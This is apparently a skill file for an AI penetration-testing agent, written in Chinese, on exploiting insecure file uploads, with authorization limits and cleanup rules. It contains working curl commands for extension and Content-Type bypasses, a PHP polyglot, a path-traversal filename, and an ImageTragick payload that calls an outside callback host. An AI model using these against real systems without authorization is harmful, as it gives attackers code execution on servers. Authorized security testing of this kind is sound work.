---
name: file-upload
description: 检测和利用不安全的文件上传功能，包括扩展名绕过、内容类型欺骗、polyglot 文件和图像处理库漏洞利用。
category: web
source: xalgorix
tags:
  - 文件上传
  - RCE
  - Webshell
  - ImageTragick
required_tools:
  - curl
  - exiftool
---

# 文件上传漏洞利用

## 适用场景

- 目标应用允许上传文件（头像、附件、文档、图片）。
- 需要测试文件类型验证是否可被绕过。
- 目标使用了图像处理库（ImageMagick、Ghostscript），可能存在已知 CVE。

## 授权边界

- **上传 Webshell 等同于在目标服务器上获得代码执行权限，属于高风险操作。**
- 必须使用无害 webshell（仅输出系统信息或 `phpinfo()`，不执行命令）。
- 测试完成后必须删除上传的测试文件。
- 如果 webshell 可被其他用户访问，立即报告主代理并删除。

## 前置条件

- 已识别所有文件上传端点。
- 有有效的测试账号（如上传需要认证）。
- 已安装 `exiftool`（用于元数据注入测试）。

## 执行步骤

### 步骤 1：映射上传点和限制

```bash
# 查找上传端点
katana -u https://<target> -d 2 | grep -iE "upload|file|attach|import|avatar"

# 测试基本上传
curl -v -X POST "https://<target>/upload" \
  -F "file=@test.txt" \
  -H "Authorization: Bearer $TOKEN"
```

观察响应中的限制提示（允许的类型、大小限制）。

### 步骤 2：扩展名绕过

```bash
# 尝试常见绕过
# 双扩展名
curl -X POST "https://<target>/upload" -F "file=@shell.php.jpg"

# Null byte（旧版 PHP）
curl -X POST "https://<target>/upload" -F "file=@shell.php%00.jpg"

# 大小写混合
curl -X POST "https://<target>/upload" -F "file=@shell.pHp"

# 特殊扩展名（取决于服务器）
# PHP: .phtml, .php5, .pht, .shtml
# ASP.NET: .asp, .aspx, .ashx, .asmx
# Java: .jsp, .jspx, .war
```

### 步骤 3：内容类型和幻数绕过

```bash
# Content-Type 欺骗
curl -X POST "https://<target>/upload" \
  -F "file=@shell.php;type=image/jpeg"

# 幻数绕过 — 生成带 JPEG 头的 PHP 文件
printf '\xff\xd8\xff\xe0\n<?php phpinfo();?>' > polyglot_jpeg.php
curl -X POST "https://<target>/upload" -F "file=@polyglot_jpeg.php;type=image/jpeg"
```

### 步骤 4：路径穿越上传

```bash
# 尝试控制上传路径
curl -X POST "https://<target>/upload" \
  -F "file=@shell.php;filename=../../shell.php"
```

### 步骤 5：图像处理库利用

```bash
# ImageTragick 测试（CVE-2016-3714）
cat > tragick_test.mvg << 'EOF'
push graphic-context
viewbox 0 0 640 480
fill 'url(https://<interactsh_server>/test)'
pop graphic-context
EOF
curl -X POST "https://<target>/upload" -F "file=@tragick_test.mvg"
```

观察 Interactsh 是否收到请求。

### 步骤 6：验证 Webshell

```bash
# 如果上传成功，探测 webshell 位置
# 常见路径：
# /uploads/<filename>
# /images/<filename>
# /media/<filename>
# /files/<filename>
# /attachments/<filename>
# /usercontent/<year>/<month>/<filename>

curl "https://<target>/uploads/polyglot_jpeg.php"
```

### 步骤 7：清理

```bash
# 记录所有上传文件的路径
# 测试完成后逐个删除，或通过应用界面删除
```

## 停止条件

- 上传的 webshell 可被未认证用户访问时，立即删除并报告为严重漏洞。
- 目标为生产环境且上传行为可能影响其他用户时（如覆盖全局配置），停止测试。
- 利用图像处理库漏洞可能导致服务崩溃，测试时注意响应状态。

## 输出格式

- 上传端点列表和限制条件。
- 有效的绕过方法（扩展名、Content-Type、幻数）。
- 上传成功的 webshell 路径和验证结果。
- 图像处理库漏洞测试结果。
- 清理确认。
- 建议下一步：是否需要利用 webshell 进行权限提升。

## 验收标准

1. 至少测试了 5 种扩展名绕过方法。
2. 尝试了 Content-Type 欺骗和幻数绕过。
3. 测试了路径穿越上传。
4. 所有测试文件已清理（或记录了无法删除的原因）。
5. 未在生产环境留下可被外部访问的 webshell。
